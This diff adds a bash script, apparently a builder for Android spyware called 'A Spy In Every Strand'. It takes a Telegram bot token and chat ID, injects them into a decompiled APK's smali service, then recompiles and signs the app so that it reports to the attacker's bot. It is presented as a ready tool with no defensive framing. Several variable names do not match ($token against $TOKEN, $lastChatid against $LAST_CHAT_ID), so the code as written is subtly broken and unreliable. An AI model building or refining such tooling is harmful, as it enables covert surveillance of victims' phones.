@@ -1,0 +1,163 @@
+#!/bin/bash
+
+# Define colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color (reset)
+
+clear
+
+#logo
+echo -e "$GREEN
+    ─────────────────────────────────────
+    ─────────────────────────────────────
+    ──█▀─█▀█─█▄█─█▀▀─█░█─█▀▀─▀█▀─▀█▀─█───
+    ──▄█─█▀▀─░█░─█▄█─█▀█─██▄─░█░─░█░─█───
+    ──────────A─Spy─In─Every─Strand──────
+    ─────────────────────────────────────
+$NC"
+
+#verbose option
+verbose=false
+while getopts ":v" opt; do
+  case $opt in
+    v) verbose=true ;;
+    \?) ;;
+  esac
+done
+
+#verbose option display
+echo -e "${GREEN}───────────────────────────────────────${NC}"
+echo -e "Author : ${GREEN}sundaesploits${NC}"
+echo -e "verbose : ${GREEN}$verbose${NC}"
+echo -e "${GREEN}───────────────────────────────────────${NC}"
+
+#collect bot token
+echo -e "${GREEN}Enter telegram Bot Token : $NC"
+read TOKEN
+
+#verify bot
+BOT_USERNAME=$(curl -s "https://api.telegram.org/bot$TOKEN/getMe"|jq '.result.username')
+
+#check if bot exists
+if [ "$BOT_USERNAME" == "null" ]; then
+    echo -e "${RED}[X]Bot Not found! Recheck your Bot token and try again $NC"
+    exit
+else
+    echo -e "${GREEN}[+]Bot Found $YELLOW $BOT_USERNAME $NC"
+fi
+
+#last chatID
+LAST_MESSAGE=$(curl -s "https://api.telegram.org/bot$TOKEN/getUpdates"|jq '.result[0].message.from | {first_name, id}')
+LAST_CHAT_ID=$(echo "$LAST_MESSAGE" | jq -r '.id')
+LAST_USER=$(echo "$LAST_MESSAGE" | jq -r '.first_name')
+
+#check existing chatid
+if [ "$LAST_CHATID" == "null" ]; then
+    echo -e "${RED}[X]No Chat IDs found! go to https://t.me/$BOT_USERNAME and send some message and try again $NC"
+    exit
+else
+    echo -e "${GREEN}[+]Found $YELLOW $LAST_CHAT_ID ($LAST_USER) $GREEN \nPress 'Enter' to proceed with $lastChatid \nor CTRL+C to Quit$NC"
+    read enter
+fi
+
+#decompile
+if outputDecompile=$(java -jar ./Tools/apktool_2.11.1.jar d ./Base/base.apk -f -r -o Decompiled 2>&1);then
+
+    #echo verbose
+    if $verbose; then
+        echo -e "${YELLOW}$outputDecompile${NC}"
+    fi
+    echo -e "${GREEN}[+]Decompiled app : ./Base/base.apk$NC"
+
+else
+    #echo verbose
+    if $verbose; then
+        echo -e "${RED}$outputDecompile${NC}"
+    fi
+    echo -e "${RED}[X]Failed to Decompile app : ./Base/base.apk$NC"
+fi
+
+#modifying content in smali
+file_content=$(<./Decompiled/smali/com/example/test1/Foreground.smali)
+file_content_modified="${file_content/TOKEN/$token}"
+file_content_modified="${file_content_modified/CHATID/$lastChatid}"
+echo "$file_content_modified" > ./Decompiled/smali/com/example/test1/Foreground.smali
+echo -e "${GREEN}[+]Modified Smali Value $NC"
+
+
+#create temp folder
+if outputMkdir=$(mkdir tempFolder 2>/dev/null);then
+    echo -e "${GREEN}[+]tempfolder Created$NC"
+else
+    echo -e "${GREEN}[+]tempfolder Aready Exists$NC"
+fi
+
+#recompile
+if outputRecompile=$(java -jar ./Tools/apktool_2.11.1.jar b Decompiled/ -o ./tempFolder/myApp-unsigned.apk 2>&1);then
+    #echo verbose
+    if $verbose; then
+        echo -e "${YELLOW}$outputRecompile${NC}"
+    fi
+    echo -e "${GREEN}[+]Recompiled app : ./Decompiled$NC"
+
+else
+    #echo verbose
+    if $verbose; then
+        echo -e "${RED}$outputRecompile${NC}"
+    fi
+    echo -e "${RED}[X]Failed to Recompile app : ./Decompiled$NC"
+fi
+
+#align
+arch=$(uname -m)
+if [[ "$arch" == "x86_64" ]]; then
+  zipalign=./Tools/zipalign
+else
+  zipalign=./Tools/zipalign-m
+fi
+
+if outputZipalign=$($zipalign -p -f 4 ./tempFolder/myApp-unsigned.apk ./tempFolder/myApp-aligned.apk 2>&1);then
+#echo verbose
+    if $verbose; then
+        echo -e "${YELLOW}$outputZipalign${NC}"
+    fi
+    echo -e "${GREEN}[+]Aligned app  : ./tempFolder/myApp-unsigned.apk$NC"
+
+else
+    #echo verbose
+    if $verbose; then
+        echo -e "${RED}$outputZipalign${NC}"
+    fi
+    echo -e "${RED}[X]Failed to Align App : ./tempFolder/myApp-unsigned.apk$NC"
+fi
+
+#sign apk
+if outputApksigner=$(java -jar ./Tools/apksigner.jar sign   --ks ./Base/test.jks   --ks-key-alias key0   --ks-pass pass:11111111   --key-pass pass:11111111   --out myApp-final.apk   ./tempFolder/myApp-aligned.apk 2>&1);then
+    #echo verbose
+    if $verbose; then
+        echo -e "${YELLOW}$outputApksigner${NC}"
+    fi
+    echo -e "${GREEN}[+]Signed App  : ./tempFolder/myApp-aligned.apk$NC"
+
+else
+    #echo verbose
+    if $verbose; then
+        echo -e "${RED}$outputApksigner${NC}"
+    fi
+    echo -e "${RED}[X]Failed to Sign App : ./tempFolder/myApp-aligned.apk$NC"
+fi
+
+#remove temp files
+rm  Decompiled/ -r
+rm  tempFolder/ -r
+rm  myApp-final.apk.idsig 
+echo -e "${GREEN}[+]Cleared Temp files$NC"
+
+#verify Signature
+java -jar ./Tools/apksigner.jar verify myApp-final.apk && echo -e "${YELLOW}✔ Signature OK $NC"
+
+dir=$(pwd)/myApp-final.apk
+echo -e "${YELLOW}Generated App Located at : $dir $NC"
